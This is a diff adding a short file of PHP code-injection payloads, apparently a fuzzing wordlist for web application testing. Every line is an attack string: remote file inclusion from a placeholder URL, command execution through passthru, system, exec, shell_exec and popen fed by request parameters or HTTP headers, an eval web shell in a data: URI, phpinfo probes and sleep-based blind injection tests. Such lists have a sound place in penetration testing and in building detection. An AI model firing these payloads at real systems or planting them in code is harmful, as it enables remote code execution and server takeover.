@@ -1,0 +1,16 @@
+{${include("http://url/code.txt")}}
+1);error_reporting(0);passthru(base64_decode(\$_SERVER[HTTP_CMD])
+<?php passthru(getenv("HTTP_ACCEPT_LANGUAGE"));?>
+5";+echo+"PHP Code";+$aaa="
+data:,<?php eval($_REQUEST[cmd]);?>&cmd=phpinfo();
+";phpinfo();
+phpinfo();
+phpinfo%28%29;
+<?php system("calc.exe"); ?>
+<?php include $_GET["d"]; ?>
+<? exec($_REQUEST["c"]); ?>
+<? @shell_exec($_REQUEST["c"]); ?>
+<? popen($_REQUEST["c4"]); ?> 
+',''));sleep(10);exit;/*
+)''.sleep(10).''
+{${sleep(10)}}
